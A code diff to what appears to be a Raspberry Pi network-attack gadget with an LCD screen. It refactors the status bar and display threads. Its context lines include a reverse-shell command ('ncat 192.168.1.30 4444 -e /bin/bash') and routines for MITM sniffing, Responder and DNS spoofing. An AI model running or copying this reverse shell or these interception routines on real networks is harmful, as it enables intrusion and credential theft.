@@ -3,22 +3,18 @@
 import os
 import subprocess
 import netifaces
-from scapy.all import ARP, Ether, srp
 from datetime import datetime
-import threading, smbus, time, pyudev, serial, struct, json
-from subprocess import STDOUT, check_output
-from PIL import Image, ImageDraw, ImageFont, ImageColor
+import threading, time, json
+from PIL import Image, ImageDraw, ImageFont
 import LCD_Config
 import LCD_1in44
 import RPi.GPIO as GPIO
-import socket
-import ipaddress
-import signal
 from functools import partial
 import time
 import sys
 import requests  # For Discord webhook integration
-from typing import List
+
+# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z
 
 # --- Plugin system ---------------------------------------------
 try:
@@ -75,46 +71,140 @@ except ImportError as e:
         return False
 _stop_evt = threading.Event()
 screen_lock = threading.Event()
+_temperature: float = 0.0
 
-# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z
+class StatusBar:
+    """Activity and temporary status management"""
+    __slots__ = ("_activity", "_temp_msg", "_temp_expires", "_lock")
 
-def _stats_loop():
+    def __init__(self):
+        self._activity: str = ""
+        self._temp_msg: str = ""
+        self._temp_expires: float = 0.0
+        self._lock = threading.Lock()
+
+    # ---- Activity status -------------------------------------------------
+    def set_activity(self, new_value: str):
+        if new_value is None:
+            return
+        with self._lock:
+            if new_value != self._activity:
+                self._activity = new_value
+
+    def get_activity(self) -> str:
+        with self._lock:
+            return self._activity
+
+    # ---- Temporary status ------------------------------------------------
+    def set_temp_status(self, message: str, ttl: float = 3.0):
+        if not message:
+            return
+        ttl = max(0.5, ttl)
+        expires = time.time() + ttl
+        with self._lock:
+            self._temp_msg = message
+            self._temp_expires = expires
+
+    # ---- Composition -----------------------------------------------------
+    def get_status_msg(self) -> str:
+        now = time.time()
+        with self._lock:
+            if self._temp_msg and now < self._temp_expires:
+                return self._temp_msg
+            if self._temp_msg and now >= self._temp_expires:
+                # clear expired temporary message
+                self._temp_msg = ""
+            return self._activity
+
+    # ---- Rendering ------------------------------------------------------
+    def render(self, draw_obj, temperature: float, font_obj) -> None:
+        """Render the top status/temperature bar."""
+        try:
+            # Background band
+            draw_obj.rectangle((0, 0, 128, 12), fill="#000000")
+            # Temperature (integer part)
+            draw_obj.text((0, 0), f"{temperature:.0f} °C ", fill="WHITE", font=font_obj)
+            # Status (may be empty)
+            status_txt = self.get_status_msg()
+            if status_txt:
+                draw_obj.text((30, 0), status_txt, fill="WHITE", font=font_obj)
+        except Exception:
+            pass
+
+    # ---- Introspection --------------------------------------------------
+    def is_busy(self) -> bool:
+        """Return True if there is any (temp or activity) message displayed.
+
+        Plugins can use this to decide whether to hide small indicators to
+        avoid visual clutter when status text is present.
+        """
+        return bool(self.get_status_msg())
+
+status_bar = StatusBar()
+
+def _compute_activity_status() -> str:
+    try:
+        devnull = subprocess.DEVNULL
+        call = subprocess.call
+        if call(['pgrep', '-x', 'nmap'], stdout=devnull, stderr=devnull) == 0:
+            return "(Scan in progress)"
+        if 'is_mitm_running' in globals() and callable(is_mitm_running) and is_mitm_running():
+            return "(MITM & sniff)"
+        if call(['pgrep', '-x', 'ettercap'], stdout=devnull, stderr=devnull) == 0:
+            return "(DNSSpoof)"
+        if 'is_responder_running' in globals() and callable(is_responder_running) and is_responder_running():
+            return "(Responder)"
+    except Exception:
+        pass
+    return ""
+
+def _stats_update_loop():
+    global _temperature
+    """Background thread that updates stats at fixed interval regardless of render FPS."""
     while not _stop_evt.is_set():
-        if screen_lock.is_set():          # ← payload actif → on saute le dessin
-            time.sleep(0.5)
+        if not screen_lock.is_set():  # pause updates while payload owns screen
+            # Temperature (best effort)
+            try:
+                _temperature = temp()
+            except Exception:
+                _temperature = 0.0  # fallback if temperature read fails
+            # Activity status (independent of temperature errors)
+            activity = _compute_activity_status()
+            status_bar.set_activity(activity)
+        time.sleep(2.0)
+
+def _render_loop():
+    global _temperature
+    """Update stats (if needed) and render overlays."""
+    TICK = 0.1  # ~10 FPS overlay
+    while not _stop_evt.is_set():
+        if screen_lock.is_set():  # UI frozen by payload
+            time.sleep(0.2)
             continue
-        # Update only the static status bar (base layer)
-        draw.line([(0, 4), (128, 4)], fill="#222", width=10)
-        draw.text((0, 0), f"{temp():.0f} °C ", fill="WHITE", font=font)
-        status = ""
-        if subprocess.call(['pgrep', 'nmap'], stdout=subprocess.DEVNULL) == 0:
-            status = "(Scan in progress)"
-        elif is_mitm_running():
-            status = "(MITM & sniff)"
-        elif subprocess.call(['pgrep', 'ettercap'], stdout=subprocess.DEVNULL) == 0:
-            status = "(DNSSpoof)"
-        if is_responder_running():
-            status = "(Responder)"
-        draw.text((30, 0), status, fill="WHITE", font=font)
-        time.sleep(2)
+        # Prepare frame from base buffer
+        frame = image.copy()
+        draw_frame = ImageDraw.Draw(frame)
+        # Draw status/temperature bar via StatusBar helper
+        status_bar.render(draw_frame, _temperature, font)
 
-def _display_loop():
-    while not _stop_evt.is_set():
-        if not screen_lock.is_set():
-            # Double buffering: copy base image, render overlays, then push
-            frame = image.copy()
-            if '_plugin_manager' in globals() and _plugin_manager is not None:
-                try:
-                    _plugin_manager.dispatch_tick()  # frequent ticks (~10 Hz)
-                    _plugin_manager.dispatch_render_overlay(frame, ImageDraw.Draw(frame))
-                except Exception:
-                    pass
+        # Plugins overlays
+        if '_plugin_manager' in globals() and _plugin_manager is not None:
+            try:
+                _plugin_manager.dispatch_tick()
+                _plugin_manager.dispatch_render_overlay(frame, draw_frame)
+            except Exception:
+                pass
+
+        # Push to LCD
+        try:
             LCD.LCD_ShowImage(frame, 0, 0)
-        time.sleep(0.1)
+        except Exception:
+            pass
+        time.sleep(TICK)
 
 def start_background_loops():
-    threading.Thread(target=_stats_loop,   daemon=True).start()
-    threading.Thread(target=_display_loop, daemon=True).start()
+    threading.Thread(target=_stats_update_loop, daemon=True).start()
+    threading.Thread(target=_render_loop, daemon=True).start()
 
 if os.getuid() != 0:
         print("You need a sudo to run this!")
@@ -372,6 +462,7 @@ def reload_plugins():
         'is_mitm_running': is_mitm_running,
         'draw_image': lambda: image,
         'draw_obj': lambda: draw,
+        'status_bar': status_bar,
     }
     if hasattr(_plugin_manager, 'load_from_config'):
         _plugin_manager.load_from_config(cfg, ctx)
@@ -1197,8 +1288,7 @@ def defaut_Reverse():
 def remote_Reverse():
     nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
     process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
-    reverse_status = "(!!Remote launched!!)"
-    draw.text((30, 0), reverse_status, fill="WHITE", font=font)
+    status_bar.set_temp_status("(Remote shell)", ttl=5)
 
 def responder_on():
     check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
@@ -1283,8 +1373,7 @@ def Stop_MITM():
     safe_kill("arpspoof", "tcpdump")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     time.sleep(2)
-    responder_status = "(!! MITM stopped !!)"
-    draw.text((30, 0), responder_status, fill="WHITE", font=font)
+    status_bar.set_temp_status("(MITM stopped)", ttl=5)
     Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
     time.sleep(2)
 
@@ -2199,6 +2288,7 @@ if 'PluginManager' in globals() and PluginManager is not None:
             'is_mitm_running': is_mitm_running,
             'draw_image': lambda: image,
             'draw_obj': lambda: draw,
+            'status_bar': status_bar,
         }
         if hasattr(_plugin_manager, 'load_from_config'):
             _plugin_manager.load_from_config(_plugins_conf, _plugin_context)
